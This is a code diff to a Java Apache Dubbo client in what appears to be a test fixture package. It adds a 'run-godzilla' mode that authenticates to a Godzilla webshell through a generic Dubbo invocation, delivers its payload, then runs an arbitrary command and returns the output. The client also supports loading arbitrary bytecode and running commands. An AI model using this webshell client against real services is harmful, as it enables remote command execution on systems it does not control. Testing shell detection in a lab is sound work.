@@ -2,6 +2,7 @@ package io.github.reajason.dubbo.fixture.client.apache;
 
 import io.github.reajason.dubbo.fixture.api.BytecodeLoadingService;
 import io.github.reajason.dubbo.fixture.client.ClientRuntimeSupport;
+import io.github.reajason.dubbo.fixture.client.godzilla.GodzillaProtocol;
 import org.apache.dubbo.config.ApplicationConfig;
 import org.apache.dubbo.config.ReferenceConfig;
 import org.apache.dubbo.config.RegistryConfig;
@@ -11,10 +12,11 @@ import java.nio.charset.StandardCharsets;
 
 public class ApacheDubboClient {
 
-    public static void main(String[] args) {
+    public static void main(String[] args) throws Exception {
         ClientRuntimeSupport.prepareClientJvm();
         if (args.length < 1) {
-            throw new IllegalArgumentException("usage: load-bytes <url> <base64> | run-command <url> <interfaceName> <command>");
+            throw new IllegalArgumentException("usage: load-bytes <url> <base64> | run-command <url> <interfaceName> <command>"
+                    + " | run-godzilla <url> <interfaceName> <key> <pass> <command>");
         }
         if ("load-bytes".equals(args[0])) {
             if (args.length < 3) {
@@ -33,6 +35,13 @@ public class ApacheDubboClient {
             } else {
                 System.out.println(String.valueOf(result));
             }
+            return;
+        }
+        if ("run-godzilla".equals(args[0])) {
+            if (args.length < 6) {
+                throw new IllegalArgumentException("usage: run-godzilla <url> <interfaceName> <key> <pass> <command>");
+            }
+            System.out.println(runGodzilla(args[1], args[2], args[3], args[4], args[5]));
             return;
         }
         throw new IllegalArgumentException("unsupported action: " + args[0]);
@@ -55,6 +64,45 @@ public class ApacheDubboClient {
         } finally {
             reference.destroy();
         }
+    }
+
+    public static String runGodzilla(String url, String interfaceName, String configKey, String pass,
+                                     String command) throws Exception {
+        ClientRuntimeSupport.prepareClientJvm();
+        ReferenceConfig<GenericService> reference = new ReferenceConfig<GenericService>();
+        reference.setApplication(new ApplicationConfig("apache-dubbo-godzilla-client"));
+        reference.setRegistry(new RegistryConfig("N/A"));
+        reference.setInterface(interfaceName);
+        reference.setGeneric(true);
+        reference.setCheck(false);
+        reference.setTimeout(30000);
+        reference.setRetries(0);
+        reference.setUrl(url);
+
+        String transportKey = GodzillaProtocol.transportKey(configKey);
+        String passHash = GodzillaProtocol.passHash(pass, transportKey);
+        GenericService genericService = reference.get();
+        try {
+            String[] parameterTypes = new String[]{byte[].class.getName()};
+            Object payloadResponse = genericService.$invoke(
+                    "handle", parameterTypes, new Object[]{GodzillaProtocol.payloadRequest(transportKey)});
+            String payloadState = GodzillaProtocol.unwrapResponse(toBytes(payloadResponse), transportKey, passHash);
+            if (!"ok".equals(payloadState)) {
+                throw new IllegalStateException("godzilla shell rejected the payload: " + payloadState);
+            }
+            Object commandResponse = genericService.$invoke(
+                    "handle", parameterTypes, new Object[]{GodzillaProtocol.commandRequest(command, transportKey)});
+            return GodzillaProtocol.unwrapResponse(toBytes(commandResponse), transportKey, passHash);
+        } finally {
+            reference.destroy();
+        }
+    }
+
+    private static byte[] toBytes(Object response) {
+        if (response instanceof byte[]) {
+            return (byte[]) response;
+        }
+        throw new IllegalStateException("expected byte[] from the godzilla shell, got " + response);
     }
 
     public static Object runCommand(String url, String interfaceName, String command) {
